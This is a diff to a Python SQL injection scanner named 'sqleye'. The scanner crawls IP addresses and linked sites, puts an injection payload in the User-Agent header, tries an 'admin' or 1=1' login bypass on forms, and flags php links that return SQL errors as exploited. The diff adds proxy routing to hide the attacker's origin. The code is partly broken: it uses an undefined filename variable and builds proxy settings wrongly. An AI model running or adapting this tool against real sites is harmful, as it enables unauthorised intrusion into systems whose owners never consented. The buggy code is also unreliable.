@@ -8,21 +8,19 @@ import re
 ### add user agent sqli and check all textbox vectors 
 def presentation():
 
-    print(" # #############################################")
-    print(" #                                             #")
-    print(" #          eye spy with my little eye a sqli  #")
-    print(" #                                             #")
-    print(" #      ~00xZ-       github.com/00xZ           #")
-    print(" #                 -version 1.7                #")
-    print(" #                                             #")
-    print(" # #############################################")
+    print("[+] # #############################################")
+    print("[+] #                                             #")
+    print("[+] #          eye spy with my little eye a sqli  #")
+    print("[+] #      ~00xZ-       github.com/00xZ           #")
+    print("[+] #                                             #")
+    print("[+] # #############################################")
 
-def gethref(url):
-    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
+def gethref(url, proxy):
+    headers = {'User-Agent': "Mozilla/00xZ ' AND 1=1:--"}
     ur = (url)
-    print("[x] ~ SCAN: " + url + " ~ [x]")
+    print("\n[x] ~ SCAN: " + url + " ~ [x]")
     try:
-        req = requests.get(ur, timeout=6, headers=headers)
+        req = requests.get(ur, timeout=10, headers=headers, proxies=proxy)
         soup = BeautifulSoup(req.text, 'html.parser')
         for link in soup.select('a[href*="php?"]'):
             okay = (link["href"])
@@ -31,7 +29,7 @@ def gethref(url):
             fo1.write(serv + "\n")
             fo1.close
             print("      [+] Sending payload " + serv)
-            reeqee = requests.get(serv, timeout=6, headers=headers)
+            reeqee = requests.get(serv, timeout=10, headers=headers, proxies=proxy)
             souper = BeautifulSoup(reeqee.text, "html.parser")
             if souper(text=lambda t: "SQL" in t):
                 print("\n [!] " + serv + " :  [!] Exploited [!] \n")
@@ -42,7 +40,7 @@ def gethref(url):
                 print("[x] Found SQLi Input but not exploitible [x] : " + serv )
                 pass 
     except:
-        print("[!] Timed out after timeout check maybe change timeout in script: " + ur)
+        print("  [!] Timed out after timeout check maybe change timeout in script: " + ur)
 
 
 
@@ -70,7 +68,7 @@ def try_connect(url, USERS, PASSWORDS, title):
 		gethref(url)
 		
 		
-def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_contain):
+def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_contain, proxy):
 	#print("made it")
 	#print("[!] Extracting inputs")
 	url = (site)
@@ -110,7 +108,7 @@ def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_con
 			password_field: PASSWORDS.replace('\n', ''),
 		}
 		#print("[+] PAYLOAD:", payload)
-		r2 = requests.post(url, data=payload, timeout=7, headers=headers)
+		r2 = requests.post(url, data=payload, timeout=10, headers=headers, proxies=proxy)
 		soup = BeautifulSoup(r2.content, 'lxml')
 		titlenew = (soup.select_one('title').text)
 		titlez = (titlenew + " : " + title)
@@ -124,22 +122,22 @@ def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_con
 			#fo = open("LOGIN.txt", "a+")
 			#fo.write(url + "\n" + str(ipnuts) + "\n")
 			#fo.close
-			gethref(url)
+			gethref(url, proxy)
 			pass
 	except:
 		#print("shit went south")
-		gethref(url)
+		gethref(url, proxy)
 		
 		
 
-def title(url):
+def title(url, proxy):
 	url = (url)
 	sitelists = []
 	#print("[+] Deep looking: " +url)
 	blacklist = ['*stackoverflow*', '*youtu*',  '*wikipedia*', '*microsoft*', '*centos*', '*google*', '*yahoo*', '*cloudflare*','*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*' ,'*bing*']
 	try:
 		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-		rqt = requests.get(url, timeout=6, verify=True, headers=headers)
+		rqt = requests.get(url, timeout=10, verify=True, headers=headers, proxies=proxy)
 		soupr = BeautifulSoup(rqt.content, 'html.parser')
 		
 		for link in soupr.select('a[href*="http"]'):
@@ -150,7 +148,7 @@ def title(url):
 			print("[!] Found Branch: " +site)
 			if site not in sitelists:
 				try:
-					r = requests.get(site, timeout=6, verify=True, headers=headers)
+					r = requests.get(site, timeout=10, verify=True, headers=headers, proxies=proxy)
 					soup = BeautifulSoup(r.content, 'lxml')
 					title = (soup.select_one('title').text)
 					USERS = ("admin' or 1=1 :-- ")
@@ -162,7 +160,7 @@ def title(url):
 					sitelists.append(site)
 					#print(sitelists)
 					#print("Appended branch: " + site) 
-					loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
+					loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text, proxy)
 				except:
 					#print("Branch already scanned: " + site)
 					pass
@@ -172,7 +170,7 @@ def title(url):
 		pass
 	try:
 		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-		r = requests.get(url, timeout=6, verify=True, headers=headers)
+		r = requests.get(url, timeout=10, verify=True, headers=headers, proxies=proxy)
 		soup = BeautifulSoup(r.content, 'lxml')
 		title = (soup.select_one('title').text)
 		USERS = ("admin' or 1=1 :-- ")
@@ -181,38 +179,66 @@ def title(url):
 		password_field = ("password")
 		print(" [+] " + url + " : " + title + "  [+] ")
 		kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
-		loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
+		loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text, proxy)
 	except:
-		gethref(url)
-def whatitbe(ip):
+		gethref(url, proxy)
+def whatitbe(ip, proxy):
 	url = ("http://" + ip + "/")
+	print(proxy)
+	proxy = {"http": "http://" +proxy}
 	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
 	try:
-		reqeer = requests.post(url, timeout=7, headers=headers)
-		title(url)
+		reqeer = requests.get(url, timeout=10, headers=headers, proxies=proxy)
+		title(url, proxy)
 	except:
-		print("  [!] Site Timed Out- "+url+" [!] ")
+		print(" [!] Site Timed Out- "+url+" [!] ")
 		pass
 	try:
+		proxy = {"https": "http://" +proxy}
 		url = ("https://" +ip+ "/")
-		reqeer = requests.post(url, timeout=7, headers=headers)
-		title(url)
+		reqeer = requests.get(url, timeout=10, headers=headers, proxies=proxy)
+		title(url, proxy)
 	except:
-		print("  [!] Site Timed Out- "+url+" [!] ")
+		print(" [!] Site(s) Timed Out- "+url+" [!] ")
 		pass
 def main():
 	presentation()
 	count = 0
-	if len(sys.argv) < 3:
-		print("use -f for file")
-		ip = str(sys.argv[1])
-		whatitbe(ip)
-	else:
-		input_file = open(sys.argv[2])
-		#threads = (sys.argv[3])
+	if str(sys.argv[1]) == "-h":
+		print("Use:")
+		print("    Single server scan: sqleye.py IP")
+		print("    Scan with proxy: sqleye.py (IP/ -f filename) -p 1.2.3.4")
+		print("    Scan ips in file use: sqleye.py -f filename")
+	elif str(sys.argv[1]) == "-f":
+		input_file = str(sys.argv[2])
+		print ("Scanning from file: " + filename)
+		proxy = ('')
+		try:
+			if str(sys.argv[3]) == "-p":
+				proxy = str(sys.argv[4])
+				print("Proxy: " + proxy)
+			else:
+				pass
+		except:
+			pass
 		for i in input_file.readlines():
 			ip = i.strip("\n")
-			whatitbe(ip)
-
+			whatitbe(ip, proxy)
+	elif len(sys.argv) > 1 :
+		ip = str(sys.argv[1])
+		proxy = ('')
+		print("Server: " + ip)
+		try:
+			if str(sys.argv[2]) == "-p":
+				proxy = str(sys.argv[3])
+				print("Proxy: " + proxy)
+			else:
+				pass
+		except:
+			pass
+		whatitbe(ip, proxy)
+	else:
+		print("Use -h for help")
+		pass
 main()
 
